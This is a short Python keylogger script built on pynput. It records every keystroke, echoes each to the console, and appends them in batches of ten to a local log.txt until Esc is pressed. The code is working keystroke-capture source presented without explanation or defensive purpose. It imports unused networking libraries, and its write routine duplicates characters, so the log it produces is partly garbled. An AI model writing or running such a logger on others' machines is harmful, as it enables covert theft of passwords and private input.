import pynput, time, os, random, requests, socket
from pynput.keyboard import Key, Listener

count = 0
keys = []


def key_input(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        file_wr(keys)
        keys = []


def file_wr(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(str(key))
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)


def key_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=key_input, on_release=key_release) as listener:
    listener.join()
